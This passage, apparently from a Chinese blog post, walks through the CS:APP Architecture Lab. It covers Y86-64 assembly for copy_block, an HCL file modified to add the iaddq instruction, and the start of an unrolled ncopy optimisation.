class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* copy_block - Copy src to dest and return xor checksum of src */</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">copy_block</span><span class="params">(<span class="keyword">long</span> *src, <span class="keyword">long</span> *dest, <span class="keyword">long</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">long</span> val = *src++;</span><br><span class="line">        *dest++ = val;</span><br><span class="line">        result ^= val;</span><br><span class="line">        len--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这第三个函数跟链表关系不大了，给出源地址和目的地址，源地址保存了一些值，要将源地址开始的<code>len</code>长度的数据拷贝到目的地址，并且把拷贝的值异或起来并且返回。首先<code>len</code>为循环次数没得跑，那么就先可以构建出它循环的基本框架</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">L2:</span><br><span class="line">    //……</span><br><span class="line">    irmovq $1,%r9</span><br><span class="line">    subq %r9,%rdx</span><br><span class="line">    jne L2</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>然后略去的内容无非就是赋值，异或，然后就完了…最后注意一下在main函数把三个参数传好，64位的程序前六个参数依次给<code>rdi,rsi,rdx,rcx,r8,r9</code>寄存器，那么main函数就应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line">    irmovq src,%rdi</span><br><span class="line">    irmovq dest,%rsi</span><br><span class="line">    irmovq xxx,%rdx//这里的xxx自己写，写了多长的数据给多少数值</span><br><span class="line">    call copy</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>那么自己再随便取一下<code>dest</code>和<code>src</code>汇编运行后就可以看到结果。</p><p>完整代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">    .pos 0#初始化</span><br><span class="line">    irmovq stack,%rsp#初始化一个栈帧</span><br><span class="line">    call main#执行主函数</span><br><span class="line">    halt#结束</span><br><span class="line">    .align 8#对齐</span><br><span class="line">src:</span><br><span class="line">        .quad 0x00a</span><br><span class="line">        .quad 0x0b0</span><br><span class="line">        .quad 0xc00</span><br><span class="line">dest:</span><br><span class="line">        .quad 0x111</span><br><span class="line">        .quad 0x222</span><br><span class="line">        .quad 0x333</span><br><span class="line">#This is main function</span><br><span class="line">main:</span><br><span class="line">        irmovq src,%rdi</span><br><span class="line">        irmovq dest,%rsi</span><br><span class="line">    irmovq $3,%rdx#argument len</span><br><span class="line">    call copy</span><br><span class="line">    ret </span><br><span class="line">copy:</span><br><span class="line">    irmovq $0,%rax</span><br><span class="line">    irmovq $1,%r9</span><br><span class="line">    irmovq $8,%r10</span><br><span class="line">L1:</span><br><span class="line">        mrmovq (%rdi),%r8</span><br><span class="line">        xorq %r8,%rax</span><br><span class="line">        rmmovq %r8,(%rsi)</span><br><span class="line">        addq %r10,%rdi</span><br><span class="line">        addq %r10,%rsi</span><br><span class="line">        subq %r9,%rdx</span><br><span class="line">        jne L1</span><br><span class="line">        ret</span><br><span class="line">#stack starts here and grows to lower addresses</span><br><span class="line">    .pos 0x200</span><br><span class="line">stack:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果我们具体关注一下<code>111,222,333</code>内存里面的值有没有分别被修改为对应值以及返回的异或值是否与自己计算的是否相等就行了</p><p><img src="https://i.loli.net/2021/05/11/DOyk6t2KHBoQCpj.png" alt="archlab_PartA_3.png"></p><p>这样的话<code>Part A</code>就撒花啦</p><h1 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h1><p>测评方式:在<code>ptest</code>目录下执行以下命令。</p><p><code>make SIM=../seq/ssim</code></p><p>这个<code>Part B</code>大概意思就是在<code>hcl</code>文件添加一个指令<code>iaddq</code>，这个咱们照本宣科在seq-full.hcl文件对应位置加上这个指令的名称就行了，最后文件修改成这个样子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line">#<span class="comment">/* $begin seq-all-hcl */</span></span><br><span class="line">####################################################################</span><br><span class="line">#  HCL Description of Control <span class="keyword">for</span> Single Cycle Y86<span class="number">-64</span> Processor SEQ   #</span><br><span class="line">#  Copyright (C) Randal E. Bryant, David R. O<span class="number">&#x27;</span>Hallaron, <span class="number">2010</span>       #</span><br><span class="line">####################################################################</span><br><span class="line"></span><br><span class="line">## Your task is to implement the iaddq instruction</span><br><span class="line">## The file contains a declaration of the icodes</span><br><span class="line">#<span class="meta"># for iaddq (IIADDQ)</span></span><br><span class="line">## Your job is to add the rest of the logic to make it work</span><br><span class="line"></span><br><span class="line">####################################################################</span><br><span class="line">#    C Include<span class="number">&#x27;</span>s.  Don<span class="number">&#x27;</span>t alter these                               #</span><br><span class="line">###################################################################<span class="meta">#</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">quote <span class="meta-string">&#x27;#include &lt;stdio.h&gt;&#x27;</span></span></span><br><span class="line">quote <span class="string">&#x27;#include &quot;isa.h&quot;&#x27;</span></span><br><span class="line">quote <span class="string">&#x27;#include &quot;sim.h&quot;&#x27;</span></span><br><span class="line">quote <span class="string">&#x27;int sim_main(int argc, char *argv[]);&#x27;</span></span><br><span class="line">quote <span class="string">&#x27;word_t gen_pc()&#123;return 0;&#125;&#x27;</span></span><br><span class="line">quote <span class="string">&#x27;int main(int argc, char *argv[])&#x27;</span></span><br><span class="line">quote <span class="string">&#x27;  &#123;plusmode=0;return sim_main(argc,argv);&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">####################################################################</span><br><span class="line">#    Declarations.  Do <span class="keyword">not</span> change/remove/<span class="keyword">delete</span> any of these       #</span><br><span class="line">####################################################################</span><br><span class="line"></span><br><span class="line">##### Symbolic representation of Y86<span class="number">-64</span> Instruction Codes ############<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig INOP     <span class="meta-string">&#x27;I_NOP&#x27;</span></span></span><br><span class="line">wordsig IHALT    <span class="string">&#x27;I_HALT&#x27;</span></span><br><span class="line">wordsig IRRMOVQ    <span class="string">&#x27;I_RRMOVQ&#x27;</span></span><br><span class="line">wordsig IIRMOVQ    <span class="string">&#x27;I_IRMOVQ&#x27;</span></span><br><span class="line">wordsig IRMMOVQ    <span class="string">&#x27;I_RMMOVQ&#x27;</span></span><br><span class="line">wordsig IMRMOVQ    <span class="string">&#x27;I_MRMOVQ&#x27;</span></span><br><span class="line">wordsig IOPQ    <span class="string">&#x27;I_ALU&#x27;</span></span><br><span class="line">wordsig IJXX    <span class="string">&#x27;I_JMP&#x27;</span></span><br><span class="line">wordsig ICALL    <span class="string">&#x27;I_CALL&#x27;</span></span><br><span class="line">wordsig IRET    <span class="string">&#x27;I_RET&#x27;</span></span><br><span class="line">wordsig IPUSHQ    <span class="string">&#x27;I_PUSHQ&#x27;</span></span><br><span class="line">wordsig IPOPQ    <span class="string">&#x27;I_POPQ&#x27;</span></span><br><span class="line"># Instruction code <span class="keyword">for</span> iaddq instruction</span><br><span class="line">wordsig IIADDQ    <span class="string">&#x27;I_IADDQ&#x27;</span></span><br><span class="line"></span><br><span class="line">##### Symbolic represenations of Y86<span class="number">-64</span> function codes                  ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig FNONE    <span class="meta-string">&#x27;F_NONE&#x27;</span>        # Default function code</span></span><br><span class="line"></span><br><span class="line">##### Symbolic representation of Y86<span class="number">-64</span> Registers referenced explicitly ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig RRSP     <span class="meta-string">&#x27;REG_RSP&#x27;</span>        # Stack Pointer</span></span><br><span class="line">wordsig RNONE    <span class="string">&#x27;REG_NONE&#x27;</span>       # Special value indicating <span class="string">&quot;no register&quot;</span></span><br><span class="line"></span><br><span class="line">##### ALU Functions referenced explicitly                            ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig ALUADD    <span class="meta-string">&#x27;A_ADD&#x27;</span>        # ALU should add its arguments</span></span><br><span class="line"></span><br><span class="line">##### Possible instruction status values                             ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig SAOK    <span class="meta-string">&#x27;STAT_AOK&#x27;</span>    # Normal execution</span></span><br><span class="line">wordsig SADR    <span class="string">&#x27;STAT_ADR&#x27;</span>    # Invalid memory address</span><br><span class="line">wordsig SINS    <span class="string">&#x27;STAT_INS&#x27;</span>    # Invalid instruction</span><br><span class="line">wordsig SHLT    <span class="string">&#x27;STAT_HLT&#x27;</span>    # Halt instruction encountered</span><br><span class="line"></span><br><span class="line">##### Signals that can be referenced by control logic ####################</span><br><span class="line"></span><br><span class="line">##### Fetch stage inputs        ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig pc <span class="meta-string">&#x27;pc&#x27;</span>                # Program counter</span></span><br><span class="line">##### Fetch stage computations        ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig imem_icode <span class="meta-string">&#x27;imem_icode&#x27;</span>        # icode field from instruction memory</span></span><br><span class="line">wordsig imem_ifun  <span class="string">&#x27;imem_ifun&#x27;</span>         <span class="meta"># ifun field from instruction memory</span></span><br><span class="line">wordsig icode      <span class="string">&#x27;icode&#x27;</span>        # Instruction control code</span><br><span class="line">wordsig ifun      <span class="string">&#x27;ifun&#x27;</span>        # Instruction function</span><br><span class="line">wordsig rA      <span class="string">&#x27;ra&#x27;</span>            # rA field from instruction</span><br><span class="line">wordsig rB      <span class="string">&#x27;rb&#x27;</span>            # rB field from instruction</span><br><span class="line">wordsig valC      <span class="string">&#x27;valc&#x27;</span>        # Constant from instruction</span><br><span class="line">wordsig valP      <span class="string">&#x27;valp&#x27;</span>        # Address of following instruction</span><br><span class="line">boolsig imem_error <span class="string">&#x27;imem_error&#x27;</span>        # Error signal from instruction memory</span><br><span class="line">boolsig instr_valid <span class="string">&#x27;instr_valid&#x27;</span>    # Is fetched instruction valid?</span><br><span class="line"></span><br><span class="line">##### Decode stage computations        ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig valA    <span class="meta-string">&#x27;vala&#x27;</span>            # Value from register A port</span></span><br><span class="line">wordsig valB    <span class="string">&#x27;valb&#x27;</span>            # Value from <span class="keyword">register</span> B port</span><br><span class="line"></span><br><span class="line">##### Execute stage computations    ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig valE    <span class="meta-string">&#x27;vale&#x27;</span>            # Value computed by ALU</span></span><br><span class="line">boolsig Cnd    <span class="string">&#x27;cond&#x27;</span>            # Branch test</span><br><span class="line"></span><br><span class="line">##### Memory stage computations        ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig valM    <span class="meta-string">&#x27;valm&#x27;</span>            # Value read from memory</span></span><br><span class="line">boolsig dmem_error <span class="string">&#x27;dmem_error&#x27;</span>        # Error signal from data memory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">####################################################################</span><br><span class="line">#    Control Signal Definitions.                                   #</span><br><span class="line">####################################################################</span><br><span class="line"></span><br><span class="line">################ Fetch Stage     ###################################</span><br><span class="line"></span><br><span class="line"># Determine instruction code</span><br><span class="line">word icode = [</span><br><span class="line">    imem_error: INOP;</span><br><span class="line">    <span class="number">1</span>: imem_icode;        # Default: get from instruction memory</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"># Determine instruction function</span><br><span class="line">word ifun = [</span><br><span class="line">    imem_error: FNONE;</span><br><span class="line">    <span class="number">1</span>: imem_ifun;        # Default: get from instruction memory</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> instr_valid = icode in </span><br><span class="line">    &#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,</span><br><span class="line">           IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a regid byte?</span><br><span class="line"><span class="keyword">bool</span> need_regids =</span><br><span class="line">    icode in &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, </span><br><span class="line">             IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a constant word?</span><br><span class="line"><span class="keyword">bool</span> need_valC =</span><br><span class="line">    icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line">################ Decode Stage    ###################################</span><br><span class="line"></span><br><span class="line">## What <span class="keyword">register</span> should be used as the A source?</span><br><span class="line">word srcA = [</span><br><span class="line">    icode in &#123; IRRMOVQ, IRMMOVQ, IOPQ, IPUSHQ  &#125; : rA;</span><br><span class="line">    icode in &#123; IPOPQ, IRET &#125; : RRSP;</span><br><span class="line">    <span class="number">1</span> : RNONE; # Don<span class="number">&#x27;</span>t need <span class="keyword">register</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What <span class="keyword">register</span> should be used as the B source?</span><br><span class="line">word srcB = [</span><br><span class="line">    icode in &#123; IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  &#125; : rB;</span><br><span class="line">    icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">    <span class="number">1</span> : RNONE;  # Don<span class="number">&#x27;</span>t need <span class="keyword">register</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What <span class="keyword">register</span> should be used as the E destination?</span><br><span class="line">word dstE = [</span><br><span class="line">    icode in &#123; IRRMOVQ &#125; &amp;&amp; Cnd : rB;</span><br><span class="line">    icode in &#123; IIRMOVQ, IOPQ, IIADDQ&#125; : rB;</span><br><span class="line">    icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">    <span class="number">1</span> : RNONE;  # Don<span class="number">&#x27;</span>t write any <span class="keyword">register</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What <span class="keyword">register</span> should be used as the M destination?</span><br><span class="line">word dstM = [</span><br><span class="line">    icode in &#123; IMRMOVQ, IPOPQ &#125; : rA;</span><br><span class="line">    <span class="number">1</span> : RNONE;  # Don<span class="number">&#x27;</span>t write any <span class="keyword">register</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">################ Execute Stage   ###################################</span><br><span class="line"></span><br><span class="line">## Select input A to ALU</span><br><span class="line">word aluA = [</span><br><span class="line">    icode in &#123; IRRMOVQ, IOPQ &#125; : valA;</span><br><span class="line">    icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125; : valC;</span><br><span class="line">    icode in &#123; ICALL, IPUSHQ &#125; : <span class="number">-8</span>;</span><br><span class="line">    icode in &#123; IRET, IPOPQ &#125; : <span class="number">8</span>;</span><br><span class="line">    # Other instructions don<span class="number">&#x27;</span>t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Select input B to ALU</span><br><span class="line">word aluB = [</span><br><span class="line">    icode in &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, </span><br><span class="line">              IPUSHQ, IRET, IPOPQ, IIADDQ &#125; : valB;</span><br><span class="line">    icode in &#123; IRRMOVQ, IIRMOVQ &#125; : <span class="number">0</span>;</span><br><span class="line">    # Other instructions don<span class="number">&#x27;</span>t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Set the ALU function</span><br><span class="line">word alufun = [</span><br><span class="line">    icode == IOPQ : ifun;</span><br><span class="line">    <span class="number">1</span> : ALUADD;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Should the condition codes be updated?</span><br><span class="line">+<span class="keyword">bool</span> set_cc = icode in &#123; IOPQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line">################ Memory Stage    ###################################</span><br><span class="line"></span><br><span class="line">## Set read control signal</span><br><span class="line"><span class="keyword">bool</span> mem_read = icode in &#123; IMRMOVQ, IPOPQ, IRET &#125;;</span><br><span class="line"></span><br><span class="line">## Set write control signal</span><br><span class="line"><span class="keyword">bool</span> mem_write = icode in &#123; IRMMOVQ, IPUSHQ, ICALL &#125;;</span><br><span class="line"></span><br><span class="line">## Select memory address</span><br><span class="line">word mem_addr = [</span><br><span class="line">    icode in &#123; IRMMOVQ, IPUSHQ, ICALL, IMRMOVQ &#125; : valE;</span><br><span class="line">    icode in &#123; IPOPQ, IRET &#125; : valA;</span><br><span class="line">    # Other instructions don<span class="number">&#x27;</span>t need address</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Select memory input data</span><br><span class="line">word mem_data = [</span><br><span class="line">    # Value from <span class="keyword">register</span></span><br><span class="line">    icode in &#123; IRMMOVQ, IPUSHQ &#125; : valA;</span><br><span class="line">    # Return PC</span><br><span class="line">    icode == ICALL : valP;</span><br><span class="line">    # Default: Don<span class="number">&#x27;</span>t write anything</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Determine instruction status</span><br><span class="line">word Stat = [</span><br><span class="line">    imem_error || dmem_error : SADR;</span><br><span class="line">    !instr_valid: SINS;</span><br><span class="line">    icode == IHALT : SHLT;</span><br><span class="line">    <span class="number">1</span> : SAOK;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">################ Program Counter Update ############################</span><br><span class="line"></span><br><span class="line">## What address should instruction be fetched at</span><br><span class="line"></span><br><span class="line">word new_pc = [</span><br><span class="line">    # Call.  Use instruction constant</span><br><span class="line">    icode == ICALL : valC;</span><br><span class="line">    # Taken branch.  Use instruction constant</span><br><span class="line">    icode == IJXX &amp;&amp; Cnd : valC;</span><br><span class="line">    # Completion of RET instruction.  Use value from <span class="built_in">stack</span></span><br><span class="line">    icode == IRET : valM;</span><br><span class="line">    # Default: Use incremented PC</span><br><span class="line">    <span class="number">1</span> : valP;</span><br><span class="line">];</span><br><span class="line">#<span class="comment">/* $end seq-all-hcl */</span></span><br></pre></td></tr></table></figure><p>PS:咱这个实验没有自己作过，上面的修改方式参照了别的师傅的wp，然后我其实突然发现我直接测评也是直接满掉的，不知道为啥，所以这个还是不能算我自己写的，我也是真不会，我也不知道哪里需要添加，为什么以及它工作的原理是真的不知道，以后变强了看看这里能不能更新一下解决这个问题吧。<code>qwq</code></p><p><img src="https://i.loli.net/2021/05/11/dsAba43ELxCyrSl.png" alt="archlab_PartB_1.png"></p><h1 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h1><p>Part C在寒假的逆向培训中我还是记得很清楚的，循环次数缩减可以用每次移动八个字节，循环执行[len/8]次，然后再一字节一字节移动len%8次，利用这个思路去优化memcpy函数来着的。</p><p><img src="https://i.loli.net/2021/05/11/mqklds3JaxiROow.png" alt="archlab_PartC_2.png"></p><p>然后写出优化的思路：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"># You can modify this portion</span><br><span class="line">    # Loop header</span><br><span class="line">    xorq %rax,%rax        # count = 0;</span><br><span class="line">    iaddq $-4, %rdx</span><br><span class="line">    jle EQ0</span><br><span class="line"></span><br><span class="line">Npos0:</span><br><span class="line">    mrmovq (%rdi), %r10</span><br><span class="line">    mrmovq 8(%rdi), %r11</span><br><span class="line">    mrmovq 16(%rdi), %r12</span><br><span class="line">    mrmovq 24(%rdi), %r13</span><br><span class="line">    mrmovq 32(%rdi), %r14</span><br><span class="line">    rmmovq %r10, (%rsi)</span><br><span class="line">    andq %r10, %r10        # val &lt;= 0?</span><br><span class="line">    jle Npos1</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">Npos1:</span><br><span class="line">    rmmovq %r11, 8(%rsi)</span><br><span class="line">    andq %r11, %r11        # val &lt;= 0?</span><br><span class="line">    jle Npos2</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">Npos2:</span><br><span class="line">    rmmovq %r12, 16(%rsi)</span><br><span class="line">    andq %r12, %r12        # val &lt;= 0?</span><br><span class="line">    jle Npos3</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">Npos3:</span><br><span class="line">    rmmovq %r13, 24(%rsi)</span><br><span class="line">    andq %r13, %r13    # val &lt;= 0?</span><br><span class="line">    jle Npos4</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">Npos4:</span><br><span class="line">    rmmovq %r14, 32(%rsi)</span><br><span class="line">    andq %r14, %r14    # val &lt;= 0?</span><br><span class="line">    jle Tail</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">Tail:</span><br><span class="line">    iaddq $40, %rsi</span><br><span class="line">    iaddq $40, %rdi</span><br><span class="line">    iaddq $-5, %rdx</span><br><span class="line">    jg Npos0</span><br><span class="line"></span><br><span class="line">EQ0:</span><br><span class="line">    iaddq $4, %rdx</span><br><span class="line">    jle Done</span><br><span class="line">    mrmovq (%rdi), %r10</span><br><span class="line">    mrmovq 8(%rdi), %r11</span><br><span class="line">    rmmovq %r10, (%rsi)</span><br><span class="line">    andq %r10, %r10</span><br><span class="line">    jle EQ1</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">EQ1:</span><br><span class="line">    iaddq $-1, %rdx</span><br><span class="line">    jle Done</span><br><span class="line">    rmmovq %r11, 8(%rsi)</span><br><span class="line">    andq %r11, %r11</span><br><span class="line">    jle EQ2</span><br><span class="line">    iaddq $1, %rax</span><br><span class="line"></span><br><span class="line">EQ2:</span><br><span class="line">    iaddq $-1, %rdx</span><br><span class="line">    jle Done</span><br><span class="line">    mrmovq 16(%rdi), %r12</span><br><span class="line">    rmmovq %r12, 16(%rsi)</span><br><span class="line">    andq %r12, %r12</span><br><span class="line">    jle EQ3</span><br><span class="line">    iaddq $1, %rax</span><br><span 